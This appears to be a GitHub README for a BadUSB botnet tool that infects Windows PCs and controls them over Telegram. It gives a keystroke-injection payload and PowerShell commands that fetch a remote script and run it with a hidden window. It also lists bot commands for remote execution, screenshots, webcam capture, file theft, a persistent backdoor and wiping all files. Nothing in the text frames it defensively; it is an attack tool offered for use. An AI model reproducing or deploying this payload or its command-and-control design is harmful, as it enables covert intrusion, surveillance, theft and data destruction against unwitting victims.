# badusb_botnet
:smiling_imp::busts_in_silhouette: Infect a pc with badusb and establish a connection through telegram.

```
> (new-object net.webclient).DownloadFile('https://github.com/alexfrancow/badusb_botnet/blob/master/poc.ps1','poc.ps1')
> powershell.exe -windowstyle hidden -file poc.ps1
```

```
DELAY 3000
GUI r
DELAY 500
STRING powershell
DELAY 500
ENTER
DELAY 750
STRING (new-object net.webclient).DownloadFile('https://github.com/alexfrancow/badusb_botnet/blob/master/poc.ps1','poc.ps1')
DELAY 500
ENTER
STRING powershell.exe -windowstyle hidden -file poc.ps1
DELAY 500
ENTER
```

#### Telegram Options

- /select ```IP``` ```command``` (Execute a command in a PC)
- /stop ```IP``` (Stop remote connection with a PC)
- /list (List all devices availables)
- /screenshot ```IP``` (Capture screen of a PC)
- /backdoor ```IP``` (Creates a persistent backdoor in a PC)
- /cleanAll ```IP``` (Clean all files in a PC)
- /ipPublic ```IP``` (Geolocate IP)
- /download ```IP``` ```file``` (Download a file from a PC)
- /hackTwitter ```IP``` 
- /webcam ```IP```
